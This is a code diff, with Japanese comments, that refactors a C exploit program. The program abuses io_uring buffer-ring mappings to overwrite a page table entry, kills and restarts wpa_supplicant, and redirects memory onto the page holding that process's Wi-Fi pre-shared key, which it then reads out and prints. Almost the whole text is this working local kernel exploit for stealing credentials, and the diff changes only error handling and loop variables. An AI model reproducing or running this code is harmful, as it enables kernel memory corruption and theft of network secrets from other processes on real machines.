@@ -1,11 +1,9 @@
 #include "wpa.h"
+#include "utils.h"
 #include <unistd.h>
-#include <err.h>
 #include <string.h>
-#include <stdio.h>
 #include <ctype.h>
 #include <liburing.h>
-#include <stdlib.h>
 
 /* PSK の長さ 256bit = 32byte*/
 const int KEY_LENGTH = 32;
@@ -22,10 +20,22 @@ const int OFFSET = 0x5000;
 // psk のページ内オフセット
 const int PAGE_IN_OFFSET = 0x1f6;
 
-void *mmap_fixed(void *addr);
-void arrange_psk(const uint64_t *psk);
+void arrange_psk(const uint64_t *psk) {
+    puts("========== PSK ==========");
+    uint64_t value;
+    for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
+        value = psk[i];
+        while (value > 0) {
+            printf("%02lx ", value % 0x100);
+            value /= 0x100;
+        }
+    }
+    puts("");
+}
 
 int main() {
+    int i;
+
     // psk を 64bit ずつ格納する配列
     uint64_t psk[KEY_LENGTH / sizeof(uint64_t)];
 
@@ -47,17 +57,9 @@ int main() {
     io_uring_register_buf_ring(&ring, &reg, 0);
 
     // ユーザ空間にマップ
-    void *pbuf_map = mmap(
-        NULL,
-        0x1000, 
-        PROT_READ | PROT_WRITE,
-        MAP_SHARED,
-        ring.ring_fd,
-        IORING_OFF_PBUF_RING
-    );
+    void *pbuf_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring.ring_fd, IORING_OFF_PBUF_RING);
     if (pbuf_map == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
+        err_exit("[-] mmap() failed");
     }
     printf("[+] pbuf mapped at %p\n", pbuf_map);
 
@@ -87,8 +89,8 @@ int main() {
 
     // ダミーページ確保
     address dummy_pages[DUMMY_PAGE];
-    for (int i = 0; i < DUMMY_PAGE; i++) {
-        dummy_pages[i].virt_addr = custom_mmap();
+    for (i = 0; i < DUMMY_PAGE; i++) {
+        dummy_pages[i].virt_addr = mmap_custom();
         if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
         dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
     }
@@ -96,30 +98,28 @@ int main() {
     // wpa_supplicant が起動中なら一度止める
     if (get_process_id()) {
         if (kill_wpa_supplicant()) {
-            printf("[-] failed to kill wpa_supplicant\n");
-            exit(1);
+            err_exit("[-] failed to kill wpa_supplicant");
         }
     }
 
     // 他のプロセスに CPU を譲る
-    for (int _ = 0; _ < 10; _++) {
+    for (i = 0; i < 10; i++) {
         sched_yield();
     }
 
     // new_map_3 解放
-    if (munmap(new_map_3, 0x1000) == -1) perror("[-] munmap() failed");
+    if (munmap(new_map_3, 0x1000) == -1) err_exit("[-] munmap() failed");
 
     // ダミーページ解放
-    for (int i = 0; i < DUMMY_PAGE; i++) {
+    for (i = 0; i < DUMMY_PAGE; i++) {
         munmap(dummy_pages[i].virt_addr, 0x1000);
     }
 
     // wpa_supplicant 起動
     if (start_wpa_supplicant()) {
-        printf("[-] failed to start wpa_supplicant\n");
-        exit(1);
+        err_exit("[-] failed to start wpa_supplicant");
     }
-    printf("[+] start wpa_supplicant\n");
+    puts("[+] start wpa_supplicant");
 
     // wpa_supplicant が秘密情報を配置するまで待機
     busy_loop(BUSY_LOOP);
@@ -145,14 +145,14 @@ int main() {
         // PTE 書き換え
         *(uint64_t *)pbuf_map = new_map_3_pfn;
 
-        printf("[+] successfully lead to the target page\n");
+        puts("[+] successfully lead to the target page");
         uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
-        for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
+        for (i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
             psk[i] = *(uint64_t *)(psk_addr + i * sizeof(uint64_t));
         }
         arrange_psk(psk);
     } else {
-        printf("[-] failed to lead to the target page\n");
+        puts("[-] failed to lead to the target page");
     }
 
     // 後処理
@@ -163,33 +163,4 @@ int main() {
     io_uring_queue_exit(&ring);
 
     return 0;
-}
-
-void *mmap_fixed(void *addr) {
-    void *new_mem = mmap(
-        addr,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-        -1,
-        0
-    );
-    if (new_mem == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
-    }
-    return new_mem;
-}
-
-void arrange_psk(const uint64_t *psk) {
-    printf("========== PSK ==========\n");
-    uint64_t value;
-    for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
-        value = psk[i];
-        while (value > 0) {
-            printf("%02lx ", value % 0x100);
-            value /= 0x100;
-        }
-    }
-    printf("\n");
 }
